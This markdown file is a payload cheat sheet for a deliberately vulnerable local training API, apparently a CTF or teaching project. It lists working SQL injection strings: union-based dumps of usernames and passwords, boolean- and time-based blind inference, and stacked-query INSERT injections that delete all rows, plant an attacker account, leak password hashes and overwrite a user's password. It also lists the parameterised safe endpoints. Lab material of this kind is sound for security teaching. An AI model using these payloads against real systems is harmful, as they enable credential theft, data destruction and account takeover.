# SQLi Attack Queries (Educational / CTF Only)

> ⚠️ These payloads are for use **only** against the intentionally vulnerable endpoints in this project.
> Do **not** use against any system you do not own or have explicit permission to test.

Base URL: `http://localhost:3000`  
Swagger UI: `http://localhost:3000/api`

---

## 1. Union-Based SQLi — `GET /sqli/union?id=<payload>`

Vulnerable query:

```sql
SELECT * FROM customers WHERE customer_id = ${id}
```

### Step 1 — Confirm column count (9 columns → returns a row)

```
0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM customers--
```

### Step 2 — Dump usernames & passwords

```
0 UNION SELECT 1,username,password,NULL,NULL,NULL,NULL,NULL,NULL FROM customers--
```

### Step 3 — Dump all customer data

```
0 UNION SELECT customer_id,customer_name,contact_name,address,city,postal_code,country,password,username FROM customers--
```

### Step 4 — Get DB metadata

```
0 UNION SELECT 1,current_user,current_database(),version(),NULL,NULL,NULL,NULL,NULL--
```

### Step 5 — List all tables in public schema

```
0 UNION SELECT 1,table_name,table_schema,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
```

### Step 6 — List columns of a specific table

```
0 UNION SELECT 1,column_name,data_type,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='customers'--
```

---

## 2. Boolean-Blind SQLi — `GET /sqli/blind?name=<payload>`

Vulnerable query:

```sql
SELECT 1 AS found FROM customers WHERE customer_name = '${name}' LIMIT 1
```

Returns `{ "exists": true }` or `{ "exists": false }` — data is inferred bit by bit.

### Confirm vulnerability (always true)

```
' OR '1'='1
```

### Infer current database name — first character is 'd'

```
' OR SUBSTRING(current_database(),1,1)='d'--
```

### Infer username character by character

```
' OR SUBSTRING((SELECT username FROM customers LIMIT 1),1,1)='a'--
```

### Infer customer_name first character

```
' OR SUBSTRING((SELECT customer_name FROM customers LIMIT 1),1,1)='A'--
```

### Infer password hash first character

```
' OR SUBSTRING((SELECT password FROM customers LIMIT 1),1,1)='$'--
```

---

## 3. Time-Based Blind SQLi — `GET /sqli/time?id=<payload>`

Vulnerable query:

```sql
SELECT * FROM customers WHERE customer_id = ${id}
```

Response is delayed by `pg_sleep(N)` seconds when the condition is true.

### Confirm vulnerability (always delays 3s)

```
1; SELECT pg_sleep(3)--
```

> The response may still show 500 because TypeORM receives two result sets.
> The **delay in response time** is what confirms the injection, not the status code.

### Infer first character of DB name (delays 3s if true)

```
1; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='d' THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### Infer first character of a username

```
1; SELECT CASE WHEN SUBSTRING((SELECT username FROM customers LIMIT 1),1,1)='a' THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### Infer first character of a password

```
1; SELECT CASE WHEN SUBSTRING((SELECT password FROM customers LIMIT 1),1,1)='$' THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

---

## Safe Endpoints (Parameterised — all payloads above are blocked)

| Endpoint                          | Protection                              |
| --------------------------------- | --------------------------------------- |
| `GET /sqli/safe/union?id=<uuid>`  | UUID v4 validation + TypeORM repository |
| `GET /sqli/safe/blind?name=<str>` | Length check + TypeORM repository       |
| `GET /sqli/safe/time?id=<uuid>`   | UUID v4 validation + TypeORM repository |
| `POST /sqli/safe/create`          | Input validation + TypeORM repository   |

---

## 4. INSERT-Based SQLi — `POST /sqli/create`

Vulnerable query (built by string interpolation):

```sql
INSERT INTO customers (customer_name, contact_name, address, city, postal_code, country, password, username)
VALUES ('${customerName}', '${contactName}', ..., '${username}')
RETURNING ...
```

### Step 1 — Confirm vulnerability (stacked query — deletes all rows)

> **⚠️ DESTRUCTIVE — only run in a disposable test environment.**

```json
{
  "customerName": "Alice'); DELETE FROM customers--",
  "contactName": "x",
  "address": "x",
  "city": "x",
  "postalCode": "00000",
  "country": "US",
  "password": "pass",
  "username": "test_delete"
}
```

### Step 2 — Inject a second row (stacked INSERT)

Inserts a hidden "attacker" account alongside the legitimate row:

```json
{
  "customerName": "Alice'), ('injected', 'injected', 'injected', 'injected', '00000', 'XX', 'hacked_pass', 'hacker_injected")--",
  "contactName": "Bob",
  "address": "123 Main St",
  "city": "New York",
  "postalCode": "10001",
  "country": "US",
  "password": "secret",
  "username": "alice01"
}
```

The effective SQL becomes:

```sql
INSERT INTO customers (...) VALUES
  ('Alice'), ('injected', ..., 'hacker_injected')--', 'Bob', ...)
```

### Step 3 — Exfiltrate data via subquery in INSERT value

Embeds the first customer's password hash into the `customer_name` field:

```json
{
  "customerName": "' || (SELECT password FROM customers ORDER BY customer_name LIMIT 1) || '",
  "contactName": "x",
  "address": "x",
  "city": "x",
  "postalCode": "00000",
  "country": "US",
  "password": "pass",
  "username": "exfil_user"
}
```

The `customer_name` of the created row will contain the leaked password hash from `RETURNING`.

### Step 4 — Escalate: UPDATE existing user password via stacked query

Changes the password of `customer_name = 'Alice'` to an attacker-controlled value.

> **Key:** all 8 VALUES must be provided before the `;` so the INSERT is syntactically valid.
> The previous pattern `Alice'); UPDATE…` only supplies 1 of 8 values and PostgreSQL rejects it
> with "INSERT has more target columns than expressions" — hence the 500.

```json
{
  "customerName": "Alice', 'x', 'x', 'x', '00000', 'US', 'tmppass', 'stacked_user'); UPDATE customers SET password='attacker_hash' WHERE customer_name='Alice'--",
  "contactName": "x",
  "address": "x",
  "city": "x",
  "postalCode": "00000",
  "country": "US",
  "password": "pass",
  "username": "escalate_test"
}
```

The effective SQL becomes:

```sql
INSERT INTO customers (customer_name, contact_name, address, city, postal_code, country, password, username)
VALUES ('Alice', 'x', 'x', 'x', '00000', 'US', 'tmppass', 'stacked_user');
UPDATE customers SET password='attacker_hash' WHERE customer_name='Alice'--', ...)
RETURNING ...
```

Two statements execute:

1. A valid INSERT creating the decoy row (`stacked_user`)
2. The UPDATE overwriting Alice's password

### Step 5 — Dump DB metadata via subquery

Embeds the current database name into the inserted row's `contact_name`:

```json
{
  "customerName": "probe",
  "contactName": "' || current_database() || '",
  "address": "x",
  "city": "x",
  "postalCode": "00000",
  "country": "US",
  "password": "pass",
  "username": "probe_db"
}
```
